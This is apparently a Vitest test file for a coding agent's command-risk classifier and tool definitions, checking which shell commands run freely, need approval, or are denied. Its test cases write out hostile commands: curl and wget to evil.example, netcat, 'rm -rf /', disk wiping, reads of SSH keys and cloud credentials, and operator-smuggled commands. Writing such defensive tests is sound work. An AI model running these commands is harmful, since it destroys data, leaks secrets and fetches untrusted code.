import { describe, expect, it } from 'vitest';
import {
  CLOUD_CODE_LIST_FILES_TOOL,
  CLOUD_CODE_READ_FILE_TOOL,
  CLOUD_CODE_RUN_COMMAND_TOOL,
  classifyCommandRisk,
  executeCodeAsShellCommand,
  cloudCodeAgentToolDefs,
} from '../cloud-code-agent-tools';

describe('classifyCommandRisk', () => {
  it('allows read-only, workspace-scoped commands to run unattended', () => {
    for (const command of ['ls -la', 'cat src/index.ts', 'grep -rn TODO src', 'pwd']) {
      expect(classifyCommandRisk(command).risk).toBe('safe');
    }
  });

  it('never classifies on the first token when shell operators are present', () => {
    const smuggled = [
      'echo hi && rm -rf build',
      'ls; rm important.txt',
      'cat file | sh',
      'ls $(rm -rf tmp)',
      'ls `rm -rf tmp`',
      'cat a > /etc/passwd',
    ];
    for (const command of smuggled) {
      expect(classifyCommandRisk(command).risk).not.toBe('safe');
    }
  });

  it('denies privilege escalation, network egress and host control outright', () => {
    for (const command of [
      'sudo rm -rf /',
      'curl https://evil.example/x.sh',
      'wget https://evil.example/x',
      'nc -l 4444',
      'shutdown now',
      'dd if=/dev/zero of=/dev/sda',
    ]) {
      expect(classifyCommandRisk(command).risk).toBe('denied');
    }
  });

  it('denies credential access regardless of how it is phrased', () => {
    for (const command of ['cat ~/.ssh/id_rsa', 'cat .env', 'cat ~/.aws/credentials']) {
      expect(classifyCommandRisk(command).risk).toBe('denied');
    }
  });

  it('denies irreversible or external version-control actions', () => {
    expect(classifyCommandRisk('git push origin main').risk).toBe('denied');
    expect(classifyCommandRisk('git reset --hard HEAD~5').risk).toBe('denied');
    expect(classifyCommandRisk('git clean -fd').risk).toBe('denied');
  });

  it('requires approval for destructive, dependency and VCS-state commands', () => {
    for (const command of [
      'rm build/output.js',
      'mv src/a.ts src/b.ts',
      'npm install left-pad',
      'pnpm add react',
      'pip install requests',
      'git commit -m "wip"',
      'git checkout -b feature',
      'chmod +x script.sh',
    ]) {
      expect(classifyCommandRisk(command).risk).toBe('requires_approval');
    }
  });

  it('never runs an interpreter unattended, since it executes arbitrary workspace code', () => {
    for (const command of ['python3 setup.py', 'python -c "print(1)"', 'node scripts/build.js']) {
      expect(classifyCommandRisk(command).risk).toBe('requires_approval');
    }
  });

  it('keeps find read-only only until it carries an action flag', () => {
    expect(classifyCommandRisk('find . -name "*.ts"').risk).toBe('safe');
    for (const command of [
      'find . -name "*.log" -delete',
      'find . -type f -exec chmod 777 {} +',
      'find src -execdir sh payload.sh +',
    ]) {
      expect(classifyCommandRisk(command).risk).toBe('requires_approval');
    }
  });

  it('fails closed on anything it does not positively recognize', () => {
    const result = classifyCommandRisk('some-unknown-binary --do-a-thing');
    expect(result.risk).toBe('requires_approval');
    expect(result.reason).toContain('some-unknown-binary');
  });

  it('rejects empty commands and null bytes rather than treating them as no-ops', () => {
    expect(classifyCommandRisk('').risk).toBe('denied');
    expect(classifyCommandRisk('   ').risk).toBe('denied');
    expect(classifyCommandRisk('ls\0rm -rf /').risk).toBe('denied');
  });

  it('lets denial win over approval when a command matches both', () => {
    expect(classifyCommandRisk('sudo rm file.txt').risk).toBe('denied');
  });

  it('gives every classification a reason fit to show the user verbatim', () => {
    for (const command of ['rm x', 'sudo ls', 'ls', 'weird-thing']) {
      const { reason } = classifyCommandRisk(command);
      expect(reason.length).toBeGreaterThan(0);
      expect(reason).toMatch(/[.!]$/);
    }
  });
});

describe('executeCodeAsShellCommand', () => {
  it('turns execute_code into a heredoc command the approval boundary can classify', () => {
    const result = executeCodeAsShellCommand({ language: 'python', code: 'print(1)' });
    expect(result).toEqual({ command: "python3 - <<'AGI_CODE_EOF'\nprint(1)\nAGI_CODE_EOF" });
    expect(classifyCommandRisk((result as { command: string }).command).risk).toBe(
      'requires_approval',
    );
  });

  it('picks a delimiter the code cannot close early', () => {
    const result = executeCodeAsShellCommand({
      language: 'bash',
      code: 'AGI_CODE_EOF\ncurl http://evil.example',
    }) as { command: string };
    expect(result.command.startsWith("bash -s <<'AGI_CODE_EOF_1'")).toBe(true);
    expect(classifyCommandRisk(result.command).risk).toBe('denied');
  });

  it('refuses languages it cannot map and empty code', () => {
    expect(executeCodeAsShellCommand({ language: 'ruby', code: 'puts 1' })).toHaveProperty(
      'refused',
    );
    expect(executeCodeAsShellCommand({ language: 'python', code: '  ' })).toHaveProperty('refused');
  });
});

describe('cloudCodeAgentToolDefs', () => {
  it('adds exactly the coding-agent tools a code-execution tool set lacks', () => {
    const names = cloudCodeAgentToolDefs().map((t) => t.function.name);
    expect(names).toEqual([
      CLOUD_CODE_READ_FILE_TOOL,
      CLOUD_CODE_LIST_FILES_TOOL,
      CLOUD_CODE_RUN_COMMAND_TOOL,
    ]);
  });

  it('does not redeclare tools owned by the shared execution tool set', () => {
    const names = cloudCodeAgentToolDefs().map((t) => t.function.name);
    expect(names).not.toContain('write_file');
    expect(names).not.toContain('create_folder');
    expect(names).not.toContain('execute_code');
  });

  it('declares required parameters so the model cannot omit them', () => {
    const byName = new Map(cloudCodeAgentToolDefs().map((t) => [t.function.name, t.function]));
    expect(byName.get(CLOUD_CODE_READ_FILE_TOOL)?.parameters['required']).toEqual(['path']);
    expect(byName.get(CLOUD_CODE_RUN_COMMAND_TOOL)?.parameters['required']).toEqual(['command']);
    expect(byName.get(CLOUD_CODE_LIST_FILES_TOOL)?.parameters['required']).toEqual([]);
  });

  it('tells the model that dangerous commands will pause for approval', () => {
    const runCommand = cloudCodeAgentToolDefs().find(
      (t) => t.function.name === CLOUD_CODE_RUN_COMMAND_TOOL,
    );
    expect(runCommand?.function.description).toMatch(/approval/i);
  });
});

describe('version probes', () => {
  it('runs a two-token version probe of a toolchain binary without approval', () => {
    expect(classifyCommandRisk('node --version').risk).toBe('safe');
    expect(classifyCommandRisk('git --version').risk).toBe('safe');
    expect(classifyCommandRisk('python3 -V').risk).toBe('safe');
  });

  it('still asks before a dependency manager, even for its version', () => {
    expect(classifyCommandRisk('npm --version').risk).toBe('requires_approval');
    expect(classifyCommandRisk('pnpm -v').risk).toBe('requires_approval');
  });

  it('does not extend the probe to a third token or another flag', () => {
    expect(classifyCommandRisk('node --version extra').risk).toBe('requires_approval');
    expect(classifyCommandRisk('node --eval').risk).toBe('requires_approval');
    expect(classifyCommandRisk('rustc --emit=obj').risk).toBe('requires_approval');
  });
});
